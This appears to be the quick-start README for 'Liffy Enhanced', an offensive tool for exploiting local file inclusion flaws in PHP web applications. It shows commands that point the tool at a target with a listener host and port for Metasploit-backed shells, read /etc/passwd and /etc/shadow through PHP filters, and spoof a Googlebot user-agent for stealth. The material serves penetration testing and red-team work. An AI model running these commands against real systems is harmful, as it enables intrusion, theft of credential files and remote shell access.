# 🚀 Quick Start Guide

Get up and running with Liffy Enhanced in minutes!

## 📋 Prerequisites

Before you begin, ensure you have:

- **Python 3.7+** installed on your system
- **pip** package manager
- **Git** for cloning the repository
- **Metasploit Framework** (optional but recommended)

## ⚡ Installation

### Option 1: Quick Install (Recommended)

```bash
# Clone the repository
git clone https://github.com/your-repo/liffy-enhanced.git
cd liffy-enhanced

# Run the automated installation script
chmod +x install.sh
./install.sh
```

### Option 2: Manual Install

```bash
# Clone the repository
git clone https://github.com/your-repo/liffy-enhanced.git
cd liffy-enhanced

# Install Python dependencies
pip3 install -r requirements.txt

# Make files executable
chmod +x liffy_enhanced.py
chmod +x http_server.py
```

## 🎯 Basic Usage

### 1. Automatic Technique Detection

The easiest way to start is with automatic technique detection:

```bash
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444
```

This will:
- ✅ Test multiple LFI techniques automatically
- ✅ Select the best working technique
- ✅ Generate appropriate payloads
- ✅ Set up Metasploit handlers

### 2. Specific Technique

If you know which technique works, use it directly:

```bash
# Data wrapper technique
python3 liffy_enhanced.py --url http://target/file.php?page= --data --lhost 192.168.1.100 --lport 4444

# PHP input technique
python3 liffy_enhanced.py --url http://target/file.php?page= --input --lhost 192.168.1.100 --lport 4444

# File reading with filter technique
python3 liffy_enhanced.py --url http://target/file.php?page= --filter --file /etc/passwd
```

### 3. Advanced Options

```bash
# With custom User-Agent and proxy
python3 liffy_enhanced.py --url http://target/file.php?page= --auto \
  --lhost 192.168.1.100 --lport 4444 \
  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --proxy http://127.0.0.1:8080

# With session cookies and verbose output
python3 liffy_enhanced.py --url http://target/file.php?page= --data \
  --lhost 192.168.1.100 --lport 4444 \
  --cookies "PHPSESSID=abc123; security=high" \
  --verbose --output liffy.log
```

## 🔧 Configuration

### Using Configuration Files

Create a configuration file for persistent settings:

```bash
# Create default configuration
python3 liffy_enhanced.py --config-create

# Use configuration file
python3 liffy_enhanced.py --config liffy_config.json
```

### Environment Variables

Set environment variables for common settings:

```bash
export LIFFY_LHOST="192.168.1.100"
export LIFFY_LPORT="4444"
export LIFFY_USER_AGENT="Mozilla/5.0"
export LIFFY_PROXY="http://127.0.0.1:8080"
```

## 🎯 Common Use Cases

### 1. Penetration Testing

```bash
# Test for LFI vulnerabilities
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444

# Read sensitive files
python3 liffy_enhanced.py --url http://target/file.php?page= --filter --file /etc/passwd
python3 liffy_enhanced.py --url http://target/file.php?page= --filter --file /etc/shadow
python3 liffy_enhanced.py --url http://target/file.php?page= --filter --file /var/log/apache2/access.log
```

### 2. Bug Bounty

```bash
# Automated LFI discovery
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444

# With stealth options
python3 liffy_enhanced.py --url http://target/file.php?page= --auto \
  --lhost 192.168.1.100 --lport 4444 \
  --user-agent "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
  --proxy http://127.0.0.1:8080
```

### 3. Red Team Exercises

```bash
# Multi-threaded exploitation
python3 liffy_enhanced.py --url http://target/file.php?page= --auto \
  --lhost 192.168.1.100 --lport 4444 \
  --threads 5

# With custom payload
python3 liffy_enhanced.py --url http://target/file.php?page= --data \
  --lhost 192.168.1.100 --lport 4444 \
  --payload custom_shell.php
```

## 🐳 Docker Usage

### Using Docker

```bash
# Build the image
docker build -t liffy-enhanced .

# Run Liffy Enhanced
docker run -it --rm liffy-enhanced --help

# Run with volume mount
docker run -it --rm -v $(pwd)/data:/app/data liffy-enhanced \
  --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444
```

### Using Docker Compose

```bash
# Start all services
docker-compose up -d

# Run Liffy Enhanced
docker-compose exec liffy-enhanced python3 liffy_enhanced.py --help

# Run API server
docker-compose exec liffy-api python3 api_mode.py
```

## 🔌 API Usage

### Start API Server

```bash
# Start the API server
python3 api_mode.py

# Or with Docker
docker run -it --rm -p 5000:5000 liffy-enhanced python3 api_mode.py
```

### Using the API

```bash
# Execute technique via API
curl -X POST http://localhost:5000/api/execute \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "http://target/file.php?page=",
    "technique": "auto",
    "lhost": "192.168.1.100",
    "lport": 4444
  }'

# Get available techniques
curl http://localhost:5000/api/techniques

# Health check
curl http://localhost:5000/api/health
```

## 🧪 Testing

### Run Tests

```bash
# Install development dependencies
pip3 install -r requirements-dev.txt

# Run all tests
pytest tests/

# Run with coverage
pytest tests/ --cov=liffy_enhanced --cov-report=html

# Run specific test file
pytest tests/test_liffy_enhanced.py -v
```

### Test Individual Components

```bash
# Test configuration
python3 -c "from liffy_enhanced import LiffyConfig; print('Config test passed')"

# Test payload generation
python3 -c "from core_enhanced import PayloadGenerator; print('Payload test passed')"

# Test API
python3 -c "from api_mode import LiffyAPI; print('API test passed')"
```

## 🚨 Troubleshooting

### Common Issues

#### 1. Python Version Error
```bash
# Error: Python 3.7+ required
# Solution: Install Python 3.7 or higher
python3 --version
```

#### 2. Permission Denied
```bash
# Error: Permission denied
# Solution: Make files executable
chmod +x liffy_enhanced.py
chmod +x http_server.py
```

#### 3. Module Not Found
```bash
# Error: No module named 'requests'
# Solution: Install dependencies
pip3 install -r requirements.txt
```

#### 4. Metasploit Not Found
```bash
# Error: msfvenom not found
# Solution: Install Metasploit Framework
sudo apt install metasploit-framework  # Ubuntu/Debian
sudo pacman -S metasploit              # Arch Linux
brew install metasploit                # macOS
```

### Getting Help

1. **Check the logs**: Look for error messages in the output
2. **Verify installation**: Run `python3 liffy_enhanced.py --help`
3. **Check dependencies**: Ensure all required packages are installed
4. **Report issues**: Create an issue on GitHub with details

## 📚 Next Steps

Now that you have Liffy Enhanced running, explore these resources:

- **[User Guide](user-guide.md)** - Comprehensive usage documentation
- **[Techniques](techniques.md)** - Detailed exploitation technique guides
- **[Configuration](configuration.md)** - Configuration and customization
- **[Examples](examples.md)** - Real-world usage examples
- **[API Reference](api-reference.md)** - Programmatic usage documentation

## 🎉 Success!

You're now ready to use Liffy Enhanced for LFI exploitation! 

**Happy hacking! 🚀**
